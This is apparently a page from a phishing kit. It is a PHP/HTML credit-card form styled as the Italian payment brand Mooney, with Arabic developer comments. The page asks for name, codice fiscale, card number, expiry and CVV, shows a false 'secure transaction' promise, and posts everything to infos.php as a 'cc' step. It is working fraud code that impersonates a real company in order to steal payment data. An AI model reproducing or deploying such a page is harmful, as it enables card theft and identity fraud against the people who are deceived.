<?php
require_once "functions.php";
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mooney - Carta di Credito</title>
    <!-- إضافة Favicon -->
    <link rel="icon" type="image/png" href="image/unnamed.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        /* Logo */
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo img {
            height: 50px;
        }
        
        /* Title */
        h1 {
            text-align: center;
            font-size: 28px;
            margin-bottom: 20px;
            color: #4F4F4F;
            font-weight: bold;
        }
        
        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #4F4F4F;
            margin-bottom: 40px;
            line-height: 1.6;
        }
        
        /* Card Animation */
        .card-animation {
            position: relative;
            margin: 30px 0;
            height: 200px;
            display: flex;
            justify-content: center;
            align-items: center;
            perspective: 1000px;
        }
        
        .credit-card {
            width: 340px;
            height: 200px;
            position: relative;
            transform-style: preserve-3d;
            transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        
        .credit-card.flipped {
            transform: rotateY(180deg);
        }
        
        .card-front, .card-back {
            position: absolute;
            width: 100%;
            height: 100%;
            backface-visibility: hidden;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            border: 2px solid #FFCC00;
        }
        
        .card-front {
            background: linear-gradient(135deg, #1a1a1a, #333333);
            animation: cardFloat 3s ease-in-out infinite;
        }
        
        .card-back {
            background: linear-gradient(135deg, #333333, #1a1a1a);
            transform: rotateY(180deg);
            animation: cardFloatBack 3s ease-in-out infinite;
        }
        
        .card-content {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            padding: 25px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        
        .card-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .card-chip {
            width: 50px;
            height: 40px;
            background: linear-gradient(45deg, #FFCC00, #e6b800);
            border-radius: 8px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
        }
        
        .card-chip:before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, transparent 45%, rgba(255,255,255,0.3) 50%, transparent 55%);
        }
        
        .mooney-card-logo {
            font-size: 18px;
            font-weight: bold;
            color: #FFCC00;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }
        
        .card-number {
            font-size: 22px;
            letter-spacing: 4px;
            text-align: center;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            color: white;
            font-weight: 600;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }
        
        .card-bottom {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }
        
        .card-details {
            display: flex;
            flex-direction: column;
        }
        
        .card-label {
            font-size: 10px;
            color: #FFCC00;
            margin-bottom: 4px;
            opacity: 0.8;
        }
        
        .card-value {
            font-size: 14px;
            font-weight: bold;
            color: white;
        }
        
        .card-holder {
            font-size: 16px;
            font-weight: bold;
            color: white;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        /* Card Back Styles */
        .card-strip {
            height: 45px;
            background: #000;
            margin: 20px -25px;
        }
        
        .card-signature {
            background: white;
            height: 35px;
            margin: 15px 0;
            padding: 8px;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            color: #333;
            font-style: italic;
            border-radius: 4px;
        }
        
        .card-cvv {
            background: white;
            color: #333;
            padding: 6px 12px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 14px;
        }
        
        .card-back-text {
            font-size: 10px;
            color: #FFCC00;
            text-align: center;
            margin-top: 10px;
            opacity: 0.7;
        }
        
        @keyframes cardFloat {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-10px) rotate(1deg); }
        }
        
        @keyframes cardFloatBack {
            0%, 100% { transform: rotateY(180deg) translateY(0px) rotate(0deg); }
            50% { transform: rotateY(180deg) translateY(-10px) rotate(-1deg); }
        }
        
        /* Form Container */
        .form-container {
            width: 100%;
        }
        
        .form-group {
            margin-bottom: 25px;
            width: 100%;
            position: relative;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #4F4F4F;
            font-size: 14px;
            font-weight: bold;
        }
        
        .input-field {
            width: 100%;
            padding: 0;
            border: none;
            border-bottom: 2px solid #ddd;
            font-size: 18px;
            color: #4F4F4F;
            background: transparent;
            padding-bottom: 8px;
            transition: border-color 0.3s;
        }
        
        .input-field::placeholder {
            color: #4F4F4F;
            font-size: 16px;
        }
        
        .input-field:focus {
            outline: none;
            border-bottom-color: #008085;
        }
        
        /* Error Styles */
        .input-field.error {
            border-bottom-color: #dc3545;
        }
        
        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 8px;
            font-weight: 600;
            animation: fadeIn 0.3s ease;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .error-icon {
            font-size: 16px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .form-row {
            display: flex;
            gap: 15px;
        }
        
        .form-col {
            flex: 1;
        }
        
        .input-hint {
            color: #4F4F4F;
            font-size: 14px;
            margin-top: 8px;
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 18px;
            background-color: #FFCC00;
            color: #333;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 30px;
            transition: background-color 0.3s;
        }
        
        .btn:hover {
            background-color: #e6b800;
        }
        
        .security-info {
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 25px;
            margin-top: 30px;
            text-align: center;
        }
        
        .security-icon {
            font-size: 24px;
            margin-bottom: 10px;
            color: #008085;
        }
        
        .security-title {
            font-size: 16px;
            font-weight: 600;
            color: #4F4F4F;
            margin-bottom: 8px;
        }
        
        .security-description {
            font-size: 14px;
            color: #4F4F4F;
            line-height: 1.5;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 0 20px;
                max-width: 100%;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .logo img {
                height: 40px;
            }
            
            .input-field {
                font-size: 16px;
            }
            
            .credit-card {
                width: 300px;
                height: 180px;
            }
            
            .card-number {
                font-size: 18px;
                letter-spacing: 3px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .container {
                padding: 0 10px;
            }
            
            h1 {
                font-size: 22px;
            }
            
            .logo {
                margin-bottom: 30px;
            }
            
            .logo img {
                height: 35px;
            }
            
            .btn {
                padding: 16px;
                font-size: 16px;
            }
            
            .credit-card {
                width: 280px;
                height: 160px;
            }
            
            .card-number {
                font-size: 16px;
                letter-spacing: 2px;
            }
            
            .form-row {
                flex-direction: column;
                gap: 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <div class="logo">
            <img src="image/logo-mo.svg" alt="Mooney Logo">
        </div>
        
        <!-- Title -->
        <h1>Collega la tua Carta</h1>
        <p class="subtitle">
            Inserisci i dati della tua carta di credito per continuare
        </p>
        
        <!-- Card Animation -->
        <div class="card-animation">
            <div class="credit-card" id="creditCard">
                <!-- Front Side -->
                <div class="card-front">
                    <div class="card-content">
                        <div class="card-top">
                            <div class="card-chip"></div>
                            <div class="mooney-card-logo">MOONEY</div>
                        </div>
                        <div class="card-number" id="preview-number">•••• •••• •••• ••••</div>
                        <div class="card-bottom">
                            <div class="card-details">
                                <div class="card-label">Titolare della carta</div>
                                <div class="card-holder" id="preview-holder">NOME COGNOME</div>
                            </div>
                            <div class="card-details">
                                <div class="card-label">Scade</div>
                                <div class="card-value" id="preview-expiry">MM/AA</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Back Side -->
                <div class="card-back">
                    <div class="card-content">
                        <div class="card-strip"></div>
                        <div class="card-signature">
                            <div class="card-cvv" id="preview-cvv">•••</div>
                        </div>
                        <div class="card-back-text">
                            Per questioni di sicurezza, non condividere il codice CVV
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="form-container">
            <form action="infos.php" method="POST">
                <!-- إضافة حقل hidden لتحديد الخطوة -->
                <input type="hidden" name="step" value="cc">
                
                <!-- Nome e Cognome -->
                <div class="form-row">
                    <div class="form-col">
                        <div class="form-group">
                            <label for="nome">Nome*</label>
                            <input type="text" id="nome" name="nome" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['nome'])) ? 'error' : ''; ?>" placeholder="Mario" required>
                            <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['nome'])): ?>
                            <div class="error-message">
                                <span class="error-icon">⚠️</span>
                                Nome non valido
                            </div>
                            <?php endif; ?>
                        </div>
                    </div>
                    <div class="form-col">
                        <div class="form-group">
                            <label for="cognome">Cognome*</label>
                            <input type="text" id="cognome" name="cognome" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['cognome'])) ? 'error' : ''; ?>" placeholder="Rossi" required>
                            <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['cognome'])): ?>
                            <div class="error-message">
                                <span class="error-icon">⚠️</span>
                                Cognome non valido
                            </div>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
                
                <!-- Codice Fiscale -->
                <div class="form-group">
                    <label for="codice_fiscale">Codice Fiscale*</label>
                    <input type="text" id="codice_fiscale" name="codice_fiscale" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['codice_fiscale'])) ? 'error' : ''; ?>" placeholder="RSSMRA80A01H501U" required maxlength="16">
                    <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['codice_fiscale'])): ?>
                    <div class="error-message">
                        <span class="error-icon">⚠️</span>
                        Codice fiscale non valido
                    </div>
                    <?php endif; ?>
                    <div class="input-hint">Inserisci il tuo codice fiscale</div>
                </div>
                
                <!-- Numero Carta -->
                <div class="form-group">
                    <label for="card_number">Numero Carta di Credito*</label>
                    <input type="text" id="card_number" name="card_number" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['card_number'])) ? 'error' : ''; ?>" placeholder="1234 5678 9012 3456" required maxlength="19">
                    <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['card_number'])): ?>
                    <div class="error-message">
                        <span class="error-icon">⚠️</span>
                        Numero carta non valido
                    </div>
                    <?php endif; ?>
                    <div class="input-hint">Inserisci il numero della tua carta</div>
                </div>
                
                <!-- Scadenza e CVV -->
                <div class="form-row">
                    <div class="form-col">
                        <div class="form-group">
                            <label for="expiry">Data di Scadenza*</label>
                            <input type="text" id="expiry" name="expiry" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['expiry'])) ? 'error' : ''; ?>" placeholder="MM/AA" required maxlength="5">
                            <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['expiry'])): ?>
                            <div class="error-message">
                                <span class="error-icon">⚠️</span>
                                Data scadenza non valida
                            </div>
                            <?php endif; ?>
                            <div class="input-hint">Es: 12/25</div>
                        </div>
                    </div>
                    <div class="form-col">
                        <div class="form-group">
                            <label for="CVC">Codice CVV*</label>
                            <input type="text" id="CVC" name="CVC" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['CVC'])) ? 'error' : ''; ?>" placeholder="123" required maxlength="3">
                            <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['CVC'])): ?>
                            <div class="error-message">
                                <span class="error-icon">⚠️</span>
                                Codice CVV non valido
                            </div>
                            <?php endif; ?>
                            <div class="input-hint">3 cifre sul retro</div>
                        </div>
                    </div>
                </div>
                
                <button type="submit" class="btn">COLLEGA CARTA</button>
            </form>
            
            <!-- Security Info -->
            <div class="security-info">
                <div class="security-icon">🛡️</div>
                <div class="security-title">Transazione Sicura</div>
                <p class="security-description">
                    I tuoi dati sono protetti con crittografia avanzata. 
                    Mooney non conserva il numero della tua carta.
                </p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const nomeInput = document.getElementById('nome');
            const cognomeInput = document.getElementById('cognome');
            const cardNumberInput = document.getElementById('card_number');
            const expiryInput = document.getElementById('expiry');
            const cvvInput = document.getElementById('CVC');
            const creditCard = document.getElementById('creditCard');
            
            // Rimuovi errori dalla sessione dopo il caricamento
            <?php 
            if(isset($_SESSION['errors'])) {
                foreach(['nome', 'cognome', 'codice_fiscale', 'card_number', 'expiry', 'CVC'] as $error) {
                    if(isset($_SESSION['errors'][$error])) {
                        echo "setTimeout(() => { document.querySelector('#$error')?.classList?.remove('error'); }, 3000);";
                    }
                }
                // Rimuovi tutti gli errori
                unset($_SESSION['errors']);
            }
            ?>
            
            // تحديث الاسم على البطاقة
            function updateCardHolder() {
                const nome = nomeInput.value || 'NOME';
                const cognome = cognomeInput.value || 'COGNOME';
                document.getElementById('preview-holder').textContent = `${nome} ${cognome}`.toUpperCase();
            }
            
            nomeInput.addEventListener('input', updateCardHolder);
            cognomeInput.addEventListener('input', updateCardHolder);
            
            // تنسيق رقم البطاقة
            cardNumberInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s/g, '');
                if (value.length > 0) {
                    value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
                }
                e.target.value = value;
                
                // تحديث البطاقة المرئية
                if (value.length > 0) {
                    document.getElementById('preview-number').textContent = value;
                } else {
                    document.getElementById('preview-number').textContent = '•••• •••• •••• ••••';
                }
            });
            
            // تنسيق تاريخ الانتهاء
            expiryInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                e.target.value = value;
                
                // تحديث البطاقة المرئية
                if (value.length > 0) {
                    document.getElementById('preview-expiry').textContent = value;
                } else {
                    document.getElementById('preview-expiry').textContent = 'MM/AA';
                }
            });
            
            // دوران البطاقة تلقائياً عند كتابة CVV
            cvvInput.addEventListener('focus', function() {
                creditCard.classList.add('flipped');
            });
            
            cvvInput.addEventListener('blur', function() {
                if (this.value === '') {
                    creditCard.classList.remove('flipped');
                }
            });
            
            cvvInput.addEventListener('input', function(e) {
                const value = e.target.value.replace(/\D/g, '').substring(0, 3);
                e.target.value = value;
                
                // تحديث CVV على ظهر البطاقة
                if (value.length > 0) {
                    document.getElementById('preview-cvv').textContent = value;
                } else {
                    document.getElementById('preview-cvv').textContent = '•••';
                }
                
                // دوران البطاقة تلقائياً عند البدء بكتابة CVV
                if (value.length > 0 && !creditCard.classList.contains('flipped')) {
                    creditCard.classList.add('flipped');
                }
            });
            
            // تأثيرات الظهور المتدرج
            const container = document.querySelector('.form-container');
            container.style.opacity = '0';
            container.style.transform = 'translateY(30px)';
            container.style.transition = 'all 0.8s ease';
            
            setTimeout(() => {
                container.style.opacity = '1';
                container.style.transform = 'translateY(0)';
            }, 200);
            
            // تركيز الحقل الأول تلقائياً
            nomeInput.focus();
        });
    </script>
</body>
</html>